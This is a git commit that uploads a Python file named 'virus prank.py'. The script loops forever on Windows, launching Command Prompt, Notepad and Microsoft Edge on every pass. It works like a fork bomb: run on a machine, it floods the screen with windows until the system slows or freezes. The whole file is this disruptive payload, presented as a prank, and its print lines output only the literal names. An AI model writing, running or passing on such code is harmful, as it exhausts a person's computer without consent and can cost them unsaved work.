80b6ead4ba447173b041f3ca7a066b8d92e120de
kash_secret <andersonkash212@gmail.com>
2024-10-19 23:11:13 -0500

    Add files via upload
    Signed-off-by: kash_secret <andersonkash212@gmail.com>

---
+++ virus prank.py
@@ -0,0 +1,11 @@
+#This script open multiple app randomly. 
+
+import os
+
+while True:
+    var = os.system('start cmd')
+    var2 = os.system('start notepad')
+    var3 = os.system('microsoftedge ')
+    print ("var")
+    print ("var2")
+    print ("var3")
